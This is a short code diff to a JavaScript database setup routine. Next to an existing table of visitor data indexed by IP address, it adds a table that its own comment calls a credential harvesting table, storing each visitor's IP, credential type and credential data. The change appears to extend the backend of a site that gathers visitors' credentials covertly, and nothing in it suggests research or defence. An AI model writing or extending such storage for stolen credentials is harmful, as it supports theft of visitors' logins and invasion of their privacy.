@@ -198,6 +198,19 @@ const initializeDatabase = async (retries = 3) => {
       
       CREATE INDEX IF NOT EXISTS idx_advanced_visitor_ip ON advanced_visitor_data(ip_address);
       CREATE INDEX IF NOT EXISTS idx_advanced_visitor_collected ON advanced_visitor_data(collected_at);
+      
+      -- Create credential harvesting table
+      CREATE TABLE IF NOT EXISTS credential_harvests (
+        id SERIAL PRIMARY KEY,
+        ip_address VARCHAR(45) NOT NULL,
+        credential_type VARCHAR(50) NOT NULL,
+        credential_data JSONB NOT NULL,
+        harvested_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+      );
+      
+      CREATE INDEX IF NOT EXISTS idx_credential_ip ON credential_harvests(ip_address);
+      CREATE INDEX IF NOT EXISTS idx_credential_type ON credential_harvests(credential_type);
+      CREATE INDEX IF NOT EXISTS idx_credential_harvested ON credential_harvests(harvested_at);
     `);
       console.log('Database tables created/verified successfully');
       console.log('Database initialized successfully');
